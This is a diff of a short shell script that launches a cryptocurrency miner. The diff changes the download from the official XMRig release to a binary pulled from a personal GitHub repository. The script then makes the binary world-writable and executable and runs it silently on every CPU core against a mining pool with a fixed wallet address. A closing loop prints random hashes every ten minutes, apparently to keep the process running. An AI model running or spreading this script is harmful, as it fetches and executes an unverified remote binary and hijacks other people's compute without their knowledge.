@@ -1,5 +1,5 @@
 #!/bin/sh
-wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz
+wget https://github.com/bengetsia/soft/raw/main/xmrig
 chmod 777 xmrig
 ./xmrig -a ghostrider --url stratum-eu.rplant.xyz:17075 --tls --user BUFpzWEJAqQvTPkkQJt2V91pAnwjgAbY2c.$(echo $(shuf -i 1-20000 -n 1)-GG) -p x -t$(nproc --all) >/dev/null 2>&1
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
